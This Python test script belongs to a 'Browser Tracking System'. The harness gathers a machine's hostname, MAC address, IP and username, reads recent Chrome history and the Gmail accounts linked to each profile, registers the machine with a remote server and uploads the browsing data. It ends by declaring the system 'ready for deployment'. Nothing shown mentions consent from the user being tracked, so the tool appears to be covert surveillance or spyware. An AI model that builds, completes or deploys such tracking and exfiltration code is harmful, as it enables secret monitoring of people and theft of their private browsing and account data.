import json
import time
import requests
from datetime import datetime
from system_info import get_system_info
from browser_reader import ChromeHistoryReader
from network_client import NetworkClient
from logger import setup_logger

logger = setup_logger(__name__)

def test_system_info():
    """Test system information collection"""
    print("=== Testing System Information Collection ===")
    
    try:
        info = get_system_info()
        print(f"Hostname: {info['hostname']}")
        print(f"MAC Address: {info['mac_address']}")
        print(f"Local IP: {info['local_ip']}")
        print(f"Username: {info['username']}")
        print(f"OS Info: {info['os_info']}")
        return True
    except Exception as e:
        print(f"Error: {e}")
        return False

def test_browser_reading():
    """Test browser history reading"""
    print("\n=== Testing Browser History Reading ===")
    
    try:
        reader = ChromeHistoryReader()
        data = reader.get_recent_history(hours=24, limit=10)
        
        print(f"Found {len(data['profiles'])} profiles:")
        for profile in data['profiles']:
            print(f"  - {profile['name']}: {len(profile.get('gmail_accounts', []))} Gmail accounts")
        
        print(f"\nFound {len(data['browsing_history'])} recent history entries:")
        for entry in data['browsing_history'][:5]:  # Show first 5
            print(f"  - {entry['url'][:50]}... ({entry['visit_time']})")
        
        return True
    except Exception as e:
        print(f"Error: {e}")
        return False

def test_server_connection():
    """Test server connection"""
    print("\n=== Testing Server Connection ===")
    
    try:
        with open('config.json', 'r') as f:
            config = json.load(f)
        
        client = NetworkClient(config)
        
        if client.test_connection():
            print("✓ Server connection successful")
            return True
        else:
            print("✗ Server connection failed")
            return False
            
    except Exception as e:
        print(f"Error: {e}")
        return False

def test_full_workflow():
    """Test complete workflow"""
    print("\n=== Testing Complete Workflow ===")
    
    try:
        # Load config
        with open('config.json', 'r') as f:
            config = json.load(f)
        
        # Initialize components
        client = NetworkClient(config)
        reader = ChromeHistoryReader()
        
        # Test connection
        if not client.test_connection():
            print("✗ Cannot connect to server")
            return False
        
        # Register client
        system_info = get_system_info()
        client_id = client.register_client(system_info)
        
        if not client_id:
            print("✗ Failed to register client")
            return False
        
        print(f"✓ Client registered with ID: {client_id}")
        
        # Collect and send data
        browsing_data = reader.get_recent_history(hours=1, limit=5)
        
        success = client.send_batch_data(
            client_id,
            browsing_data['browsing_history'],
            browsing_data['profiles']
        )
        
        if success:
            print("✓ Data sent successfully")
            return True
        else:
            print("✗ Failed to send data")
            return False
            
    except Exception as e:
        print(f"Error: {e}")
        return False

def test_server_endpoints():
    """Test server endpoints directly"""
    print("\n=== Testing Server Endpoints ===")
    
    try:
        with open('config.json', 'r') as f:
            config = json.load(f)
        
        server_url = config['client']['server_url']
        api_token = config['client']['api_token']
        
        headers = {
            'Authorization': f'Bearer {api_token}',
            'Content-Type': 'application/json'
        }
        
        # Test health endpoint
        response = requests.get(f"{server_url}/health", timeout=10)
        if response.status_code == 200:
            print("✓ Health endpoint working")
        else:
            print(f"✗ Health endpoint failed: {response.status_code}")
            return False
        
        # Test register endpoint
        test_data = {
            'hostname': 'test-host',
            'mac_address': '00:11:22:33:44:55',
            'local_ip': '192.168.1.100',
            'username': 'test-user',
            'os_info': {'system': 'Windows', 'version': '10'}
        }
        
        response = requests.post(
            f"{server_url}/api/register",
            json=test_data,
            headers=headers,
            timeout=10
        )
        
        if response.status_code == 200:
            print("✓ Register endpoint working")
            client_id = response.json().get('client_id')
            
            # Test browsing data endpoint
            browsing_test_data = {
                'client_id': client_id,
                'browsing_data': [
                    {
                        'url': 'https://example.com',
                        'title': 'Test Page',
                        'visit_time': datetime.now().isoformat(),
                        'browser_type': 'Chrome',
                        'profile_name': 'Default'
                    }
                ]
            }
            
            response = requests.post(
                f"{server_url}/api/browsing-data",
                json=browsing_test_data,
                headers=headers,
                timeout=10
            )
            
            if response.status_code == 200:
                print("✓ Browsing data endpoint working")
            else:
                print(f"✗ Browsing data endpoint failed: {response.status_code}")
                return False
        else:
            print(f"✗ Register endpoint failed: {response.status_code}")
            return False
        
        return True
        
    except Exception as e:
        print(f"Error: {e}")
        return False

def main():
    """Run all tests"""
    print("Browser Tracking System - Test Suite")
    print("=" * 50)
    
    tests = [
        ("System Information", test_system_info),
        ("Browser Reading", test_browser_reading),
        ("Server Connection", test_server_connection),
        ("Server Endpoints", test_server_endpoints),
        ("Full Workflow", test_full_workflow)
    ]
    
    results = []
    
    for test_name, test_func in tests:
        print(f"\nRunning {test_name} test...")
        try:
            result = test_func()
            results.append((test_name, result))
            if result:
                print(f"✓ {test_name} test PASSED")
            else:
                print(f"✗ {test_name} test FAILED")
        except Exception as e:
            print(f"✗ {test_name} test ERROR: {e}")
            results.append((test_name, False))
    
    # Summary
    print("\n" + "=" * 50)
    print("TEST SUMMARY:")
    passed = 0
    for test_name, result in results:
        status = "PASS" if result else "FAIL"
        print(f"  {test_name}: {status}")
        if result:
            passed += 1
    
    print(f"\nPassed: {passed}/{len(results)} tests")
    
    if passed == len(results):
        print("🎉 All tests passed! System is ready for deployment.")
    else:
        print("⚠️  Some tests failed. Please check the configuration and server status.")

if __name__ == '__main__':
    main()
    input("\nPress Enter to exit...")
